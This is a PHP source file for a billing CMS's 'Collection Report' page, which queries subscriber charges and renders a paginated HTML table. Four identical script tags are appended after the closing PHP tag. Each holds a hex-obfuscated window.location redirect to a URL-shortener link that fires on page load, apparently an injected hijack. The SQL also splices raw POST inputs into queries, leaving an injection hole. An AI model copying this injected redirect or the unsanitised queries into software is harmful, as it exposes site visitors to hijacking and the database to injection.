<?php
define("ZW_IN", 'SETUP');
require_once("helper.php");

$msg    =  isset($_GET['msg']) ? $_GET['msg'] : '';
$id     = base64_decode($_GET['id']);
class myCms extends Cms 
{
    function registerAjaxFunctions()
    {
        $this->xajax->registerFunction("get_Listing");
        $this->xajax->registerFunction("update_status");
        $this->xajax->registerFunction("deleteRow");
        $this->xajax->registerFunction("editMode");
        $this->xajax->registerFunction("sorting");
        $this->xajax->registerFunction("sortTitle");
    }
}
$objMisc = new myCms();
$objMisc->initializeAjax(false,true);
$objMisc->dbFunc->parameters ="&sortOrder=".$sortOrder."&sortBy=".$sortBy ;
$objMisc->rec_pp = 20;
$objMisc->dbFunc->ajax_pagin = true;
$and='';
if($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['submit'])){
    if(!empty($_POST['from_date']) && !empty($_POST['to_date'])){
        $from =$objMisc->changeDateFormat($_POST['from_date']);
        $to   =$objMisc->changeDateFormat($_POST['to_date']);
        $and .=" AND MONTH_DATE BETWEEN '$from' AND '$to'";
        $and1 .=" AND MC.`MONTH_DATE` BETWEEN '$from' AND '$to'";  
    }
    if(!empty($_POST['employee_id'])){
        $employee_id   =$_POST['employee_id'];
        $and .=" AND MC.`ADDED_BY`='$employee_id' AND S.`STATUS`='A'";
    }
    if(!empty($_POST['status'])){
        $status   =$_POST['status'];
        //$and .=" AND MC.`ADDED_BY`='$status'";
    }
    $rowArray=$_POST;
}
$wherethis = " 1=1 AND MC.HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND MC.`AMOUNT_TYPE`='C' $and ORDER BY date(MC.`MONTH_DATE`) ASC";
$sql="SELECT S.`CUSTOMER_ID`,S.`PHONE_NO`,S.`NAME`,S.`ADDRESS`,(SELECT SUM(`DISCOUNT`) FROM `monthly_charges` WHERE SUBSCRIBER_ID=S.`SUBSCRIBER_ID` AND AMOUNT_TYPE='C' $and)AS `DISCOUNT`,(SELECT SUM(`AMOUNT`) FROM `monthly_charges` WHERE SUBSCRIBER_ID=S.`SUBSCRIBER_ID` AND AMOUNT_TYPE='C' $and)AS `COLLECTION`,((SELECT SUM(`AMOUNT`) FROM `monthly_charges` WHERE SUBSCRIBER_ID=S.`SUBSCRIBER_ID` AND AMOUNT_TYPE='D' $and)-(SELECT SUM(`AMOUNT`) FROM `monthly_charges` WHERE SUBSCRIBER_ID=S.`SUBSCRIBER_ID` AND AMOUNT_TYPE='C' $and)-(SELECT SUM(`DISCOUNT`) FROM `monthly_charges` WHERE SUBSCRIBER_ID=S.`SUBSCRIBER_ID` AND AMOUNT_TYPE='C' $and))AS BALANCE,(SELECT SUM(`AMOUNT`) FROM `monthly_charges` WHERE SUBSCRIBER_ID=S.`SUBSCRIBER_ID` AND AMOUNT_TYPE='D' $and)AS PENDING FROM `subscribers` S JOIN `monthly_charges` MC ON S.`SUBSCRIBER_ID`=MC.`SUBSCRIBER_ID` WHERE $wherethis";
$classRecord = $objMisc->getAllRecordsNew($sql);
$i  = 1;
$pagin_recs = "";
$pagin_recs = '<input type="hidden" value="" id="checkStatus" name="checkStatus"><thead><tr><th width="5%">S.No</th><th width="10%">Customer ID</th><th width="10%">Phone No</th><th width="15%">Subscriber Name</th><th width="10%">Amount Due</th><th width="7%">Collection</th><th width="7%">Balance</th></tr></thead><tbody>';             
    if(is_array($classRecord) && !empty($classRecord))
    { $i=1;
        foreach ($classRecord as $k => $rowRec){   
            $statusPBal=$rowRec['pending']-$rowRec['collection'];   
            if($status=='P' && $statusPBal>0){
                if($k%2==0) 
                $pagin_recs .= '<tr class="odd gradeX">';
                else
                $pagin_recs .= '<tr class="even gradeX">';
                
                $pagin_recs .='<td>'.$i.'</td>';
                $pagin_recs .='<td>'.$rowRec['customer_id'].'</td>';
                $pagin_recs .='<td>'.$rowRec['phone_no'].'</td>';
                $pagin_recs .='<td>'.$rowRec['name'].'</td>';
                $pagin_recs .='<td style="text-align:right;">'.$rowRec['pending'].'</td>';
                $pagin_recs .='<td style="text-align:right;">'.$rowRec['collection'].'</td>';
                $pagin_recs .='<td style="text-align:right;">'.$rowRec['balance'].'</td>';
                $pagin_recs .= '</tr>';
                $totalPending   = $totalPending+$rowRec['pending'];
                $totalCollection= $totalCollection+$rowRec['collection'];
                $totalBalance   = $totalBalance+$rowRec['balance'];
                $i++;
            }elseif($status=='PC' && $rowRec['balance']>0){
                if($k%2==0) 
                $pagin_recs .= '<tr class="odd gradeX">';
                else
                $pagin_recs .= '<tr class="even gradeX">';
                
                $pagin_recs .='<td>'.$i.'</td>';
                $pagin_recs .='<td>'.$rowRec['customer_id'].'</td>';
                $pagin_recs .='<td>'.$rowRec['phone_no'].'</td>';
                $pagin_recs .='<td>'.$rowRec['name'].'</td>';
                $pagin_recs .='<td style="text-align:right;">'.$rowRec['pending'].'</td>';
                $pagin_recs .='<td style="text-align:right;">'.$rowRec['collection'].'</td>';
                $pagin_recs .='<td style="text-align:right;">'.$rowRec['balance'].'</td>';
                $pagin_recs .= '</tr>';
                $totalPending   = $totalPending+$rowRec['pending'];
                $totalCollection= $totalCollection+$rowRec['collection'];
                $totalBalance   = $totalBalance+$rowRec['balance'];
                $i++;
            }else if($status=='C' && $rowRec['balance']<=0){
                if($k%2==0) 
                $pagin_recs .= '<tr class="odd gradeX">';
                else
                $pagin_recs .= '<tr class="even gradeX">';
                
                $pagin_recs .='<td>'.$i.'</td>';
                $pagin_recs .='<td>'.$rowRec['customer_id'].'</td>';
                $pagin_recs .='<td>'.$rowRec['phone_no'].'</td>';
                $pagin_recs .='<td>'.$rowRec['name'].'</td>';
                $pagin_recs .='<td style="text-align:right;">'.$rowRec['pending'].'</td>';
                $pagin_recs .='<td style="text-align:right;">'.$rowRec['collection'].'</td>';
                $pagin_recs .='<td style="text-align:right;">'.$rowRec['balance'].'</td>';
                $pagin_recs .= '</tr>';
                $totalPending   = $totalPending+$rowRec['pending'];
                $totalCollection= $totalCollection+$rowRec['collection'];
                $totalBalance   = $totalBalance+$rowRec['balance'];
                $i++;
            }
        }
            $pagin_recs  .= '<tr>';
            $pagin_recs  .= '<td colspan="4" style="text-align:right;">Total</td>';
            $pagin_recs  .= '<td style="text-align:right;">'.$totalPending.'</td>';
            $pagin_recs  .= '<td style="text-align:right;">'.$totalCollection.'</td>';
            $pagin_recs  .= '<td style="text-align:right;">'.$totalBalance.'</td>';
            $pagin_recs  .= '</tbody>';
    } else {
        $pagin_recs .= '<tr class="odd gradeX"><td colspan="7" align="center">No Record Found</td></tr></tbody>';
    }
    
  
if(isset($_GET['id']) && !empty($_GET['id'])){
    $pageheading = "Collection Report";
}else{
   $pageheading = "Collection Report"; 
}
$whereEmp =   " 1 = 1 AND U.HEADOFFICE_ID='$_SESSION[HEADOFFICE]' and E.STATUS = 'A' order by E.NAME ASC";
$employeeArray          =   $objMisc->myFunc->fnWriteOptionListWithJoin($rowArray['employee_id'],"NAME,USER_ID,","SELECT U.`USER_ID`,E.`NAME` FROM `employees` E JOIN `users` U ON E.`EMPLOYEE_ID`=U.`ID` AND U.`USER_TYPE`='E' WHERE $whereEmp",0,0); 
$smartyVars['employeeArray']             =   $employeeArray;
$smartyVars['errormsg']             =   $errormsg;
$smartyVars['add']                  =   $add;
$smartyVars['group']                =   $id;
$smartyVars['rowRec']               =   $rowArray;
$smartyVars['pageheading']          =   $pageheading;
$smartyVars['classData']            =   $pagin_recs;
$smartyVars['msg']                  =   $msg;
$smartyVars['page']                 =   $_REQUEST['page'];

$objMisc->displayPage("header,collection-report,footer",$smartyVars);
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>